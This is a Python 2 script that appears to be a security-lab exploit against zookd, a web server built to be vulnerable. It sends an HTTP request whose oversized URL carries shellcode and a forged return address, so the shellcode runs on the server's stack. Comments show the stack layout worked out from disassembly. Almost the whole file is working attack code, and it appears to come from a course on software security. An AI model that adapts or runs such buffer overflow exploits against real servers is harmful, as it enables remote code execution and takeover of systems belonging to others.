#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

def build_exploit(shellcode):
    ## zookd.c: process_client.
    ##  C:
    ##   static char env[8192];  /* static variables are not on the stack */
    ##   static size_t env_len;
    ##   char reqpath[2048];
    ##   const char *errmsg;
    ##   int i;
    ##
    ##   /* get the request line */
    ##   if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
    ##       return http_err(fd, 500, "http_request_line: %s", errmsg);
    ##
    ##  Disassembler:
    ##   0x08048ec8 <+0>: push   %ebp
    ##   0x08048ec9 <+1>: mov    %esp,%ebp               <= ebp=0xbffff618
    ##   0x08048ecb <+3>: sub    $0x838,%esp
    ##   0x08048ed1 <+9>: movl   $0x8050520,0xc(%esp)
    ##   0x08048ed9 <+17>:    movl   $0x804e520,0x8(%esp)
    ##   0x08048ee1 <+25>:    lea    -0x810(%ebp),%eax   <= reqpath
    ##   0x08048ee7 <+31>:    mov    %eax,0x4(%esp)
    ##   0x08048eeb <+35>:    mov    0x8(%ebp),%eax
    ##   0x08048eee <+38>:    mov    %eax,(%esp)
    ##   0x08048ef1 <+41>:    call   0x804914a <http_request_line>
    print list(shellcode)

    bad_url = '/' + str(shellcode) +  ('a' * (0x813 - len(shellcode)))
    bad_url += struct.pack("<I", 0xbffff618 - 0x810 + 1)
    req =   "GET " + bad_url + " HTTP/1.0\r\n" + \
            "\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

